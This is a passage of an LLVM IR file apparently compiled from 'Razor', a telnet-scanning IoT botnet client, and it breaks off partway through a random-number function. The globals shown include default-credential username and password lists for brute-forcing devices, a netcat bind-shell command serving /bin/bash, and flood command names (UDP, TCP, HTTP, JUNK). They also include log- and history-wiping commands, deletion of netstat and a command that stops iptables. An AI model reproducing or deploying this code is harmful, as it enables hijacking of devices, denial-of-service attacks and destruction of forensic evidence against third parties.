; ModuleID = 'host/ir_O3/Razor.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.state_t = type { i32, i8 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@infectline = local_unnamed_addr global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), align 8
@.str = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@commServer = local_unnamed_addr global [1 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0)], align 8
@.str.1 = private unnamed_addr constant [8 x i8] c"IP:PORT\00", align 1
@uastrings = local_unnamed_addr global [36 x i8*] [i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.37, i32 0, i32 0)], align 16
@.str.2 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.3 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.4 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.5 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.6 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.7 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.8 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.9 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.10 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.11 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.12 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.13 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.14 = private unnamed_addr constant [15 x i8] c"wii libnup/1.0\00", align 1
@.str.15 = private unnamed_addr constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00", align 1
@.str.16 = private unnamed_addr constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00", align 1
@.str.17 = private unnamed_addr constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00", align 1
@.str.18 = private unnamed_addr constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00", align 1
@.str.19 = private unnamed_addr constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.20 = private unnamed_addr constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00", align 1
@.str.21 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.22 = private unnamed_addr constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00", align 1
@.str.23 = private unnamed_addr constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00", align 1
@.str.24 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.25 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00", align 1
@.str.26 = private unnamed_addr constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00", align 1
@.str.27 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00", align 1
@.str.28 = private unnamed_addr constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00", align 1
@.str.29 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00", align 1
@.str.30 = private unnamed_addr constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.31 = private unnamed_addr constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00", align 1
@.str.32 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00", align 1
@.str.33 = private unnamed_addr constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00", align 1
@.str.34 = private unnamed_addr constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00", align 1
@.str.35 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.36 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00", align 1
@.str.37 = private unnamed_addr constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@mainCommSock = local_unnamed_addr global i32 0, align 4
@currentServer = local_unnamed_addr global i32 -1, align 4
@gotIP = local_unnamed_addr global i32 0, align 4
@numpids = local_unnamed_addr global i64 0, align 8
@macAddress = local_unnamed_addr global [6 x i8] zeroinitializer, align 1
@usernames = local_unnamed_addr global [19 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.56, i32 0, i32 0)], align 16
@.str.38 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.39 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.40 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.41 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.42 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.44 = private unnamed_addr constant [9 x i8] c"netgear\00\00", align 1
@.str.45 = private unnamed_addr constant [7 x i8] c"cisco\00\00", align 1
@.str.46 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@.str.47 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.48 = private unnamed_addr constant [15 x i8] c"Administrator\00\00", align 1
@.str.49 = private unnamed_addr constant [9 x i8] c"comcast\00\00", align 1
@.str.50 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.51 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.52 = private unnamed_addr constant [8 x i8] c"D-Link\00\00", align 1
@.str.53 = private unnamed_addr constant [9 x i8] c"manager\00\00", align 1
@.str.54 = private unnamed_addr constant [4 x i8] c"pi\00\00", align 1
@.str.55 = private unnamed_addr constant [7 x i8] c"VTech\00\00", align 1
@.str.56 = private unnamed_addr constant [9 x i8] c"vagrant\00\00", align 1
@passwords = local_unnamed_addr global [26 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0)], align 16
@.str.57 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.58 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.59 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.60 = private unnamed_addr constant [11 x i8] c"raspberry\00\00", align 1
@.str.61 = private unnamed_addr constant [15 x i8] c"vagrant\00, 123\00\00", align 1
@.str.62 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.63 = private unnamed_addr constant [10 x i8] c"dreambox\00\00", align 1
@.str.64 = private unnamed_addr constant [6 x i8] c"test\00\00", align 1
@pids = common local_unnamed_addr global i32* null, align 8
@ourIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@scanPid = common local_unnamed_addr global i32 0, align 4
@Q = internal unnamed_addr global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal unnamed_addr global i32 4095, align 4
@c = internal unnamed_addr global i32 362436, align 4
@.str.132 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.65 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal unnamed_addr global i32* null, align 8
@.str.66 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.67 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.68 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal unnamed_addr constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.69 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.70 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.71 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.73 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.74 = private unnamed_addr constant [45 x i8] c"screen -dmSL asdf nc -l -p 4000 -e /bin/bash\00", align 1
@.str.75 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.76 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.77 = private unnamed_addr constant [38 x i8] c"[RAZOR] \1B[34mATTEMPT \1B[37m-> %s:%s:%s\00", align 1
@.str.78 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.79 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.80 = private unnamed_addr constant [39 x i8] c"[RAZOR] \1B[32mEXECUTED \1B[37m-> %s:%s:%s\00", align 1
@.str.81 = private unnamed_addr constant [43 x i8] c"[RAZOR] \1B[31mUNSUCCESSFUL \1B[37m-> %s:%s:%s\00", align 1
@.str.82 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.83 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.84 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.85 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.86 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.87 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.88 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.89 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.90 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.91 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.92 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.93 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.94 = private unnamed_addr constant [17 x i8] c"SCANNER ON | OFF\00", align 1
@.str.95 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.96 = private unnamed_addr constant [24 x i8] c"STOPPING TELNET SCANNER\00", align 1
@.str.97 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.98 = private unnamed_addr constant [24 x i8] c"STARTING TELNET SCANNER\00", align 1
@.str.99 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.100 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.101 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.102 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.103 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.104 = private unnamed_addr constant [6 x i8] c"COMBO\00", align 1
@.str.105 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.106 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.107 = private unnamed_addr constant [8 x i8] c"GTFOFAG\00", align 1
@.str.108 = private unnamed_addr constant [8 x i8] c"FATCOCK\00", align 1
@.str.109 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.110 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.111 = private unnamed_addr constant [11 x i8] c"history -c\00", align 1
@.str.112 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.113 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.114 = private unnamed_addr constant [11 x i8] c"history -w\00", align 1
@.str.115 = private unnamed_addr constant [16 x i8] c"killall -9 perl\00", align 1
@.str.116 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.117 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.118 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.119 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.120 = private unnamed_addr constant [6 x i8] c"RAZER\00", align 1
@.str.121 = private unnamed_addr constant [19 x i8] c"/usr/sbin/dropbear\00", align 1
@.str.122 = private unnamed_addr constant [10 x i8] c"BUILD %s\0A\00", align 1
@.str.124 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.125 = private unnamed_addr constant [9 x i8] c"BUILD %s\00", align 1
@.str.126 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.127 = private unnamed_addr constant [6 x i8] c"DUPPP\00", align 1
@.str.128 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.129 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.130 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.131 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline norecurse nounwind uwtable
define void @init_rand(i32) local_unnamed_addr #0 {
min.iters.checked:
  store i32 %0, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %1 = add i32 %0, -1640531527
  store i32 %1, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %2 = add i32 %0, 1013904242
  store i32 %2, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  %vector.recur.init = insertelement <2 x i32> undef, i32 %0, i32 1
  %load_initial = load <2 x i32>, <2 x i32>* bitcast (i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1) to <2 x i32>*), align 4
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %min.iters.checked
  %store_forwarded = phi <2 x i32> [ %load_initial, %min.iters.checked ], [ %16, %vector.body ]
  %index = phi i64 [ 0, %min.iters.checked ], [ %index.next.1, %vector.body ]
  %vector.recur = phi <2 x i32> [ %vector.recur.init, %min.iters.checked ], [ %8, %vector.body ]
  %vec.ind = phi <2 x i64> [ <i64 3, i64 4>, %min.iters.checked ], [ %vec.ind.next.1, %vector.body ]
  %3 = or i64 %index, 3
  %4 = shufflevector <2 x i32> %vector.recur, <2 x i32> %store_forwarded, <2 x i32> <i32 1, i32 2>
  %5 = trunc <2 x i64> %vec.ind to <2 x i32>
  %6 = xor <2 x i32> %5, <i32 -1640531527, i32 -1640531527>
  %7 = xor <2 x i32> %6, %4
  %8 = xor <2 x i32> %7, %store_forwarded
  %9 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %3
  %10 = bitcast i32* %9 to <2 x i32>*
  store <2 x i32> %8, <2 x i32>* %10, align 4
  %vec.ind.next = add <2 x i64> %vec.ind, <i64 2, i64 2>
  %11 = add nsw i64 %index, 5
  %12 = shufflevector <2 x i32> %store_forwarded, <2 x i32> %8, <2 x i32> <i32 1, i32 2>
  %13 = trunc <2 x i64> %vec.ind.next to <2 x i32>
  %14 = xor <2 x i32> %13, <i32 -1640531527, i32 -1640531527>
  %15 = xor <2 x i32> %14, %12
  %16 = xor <2 x i32> %15, %8
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %11
  %18 = bitcast i32* %17 to <2 x i32>*
  store <2 x i32> %16, <2 x i32>* %18, align 4
  %index.next.1 = add nsw i64 %index, 4
  %vec.ind.next.1 = add <2 x i64> %vec.ind, <i64 4, i64 4>
  %19 = icmp eq i64 %index.next.1, 4092
  br i1 %19, label %middle.block, label %vector.body, !llvm.loop !1

middle.block:                                     ; preds = %vector.body
  br label %._crit_edge

._crit_edge:                                      ; preds = %middle.block
  %vector.recur.extract = extractelement <2 x i32> %8, i32 1
  %20 = load i32, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 4093), align 4
  %21 = xor i32 %vector.recur.extract, -1640532410
  %22 = xor i32 %21, %20
  store i32 %22, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 4095), align 4
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_cmwc() local_unnamed_addr #0 {
  %1 = load i32, i32* @rand_cmwc.i, align 4
  %2 = add i32 %1, 1
  %3 = and i32 %2, 4095
  store i32 %3, i32* @rand_cmwc.i, align 4
  %4 = zext i32 %3 to i64
  %5 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %4
  %6 = load i32, i32* %5, align 4
  %7 = zext i32 %6 to i64
  %8 = mul nuw nsw i64 %7, 18782
  %9 = load i32, i32* @c, align 4
  %10 = zext i32 %9 to i64
  %11 = add nuw nsw i64 %8, %10
  %12 = lshr i64 %11, 32
  %13 = trunc i64 %12 to i32
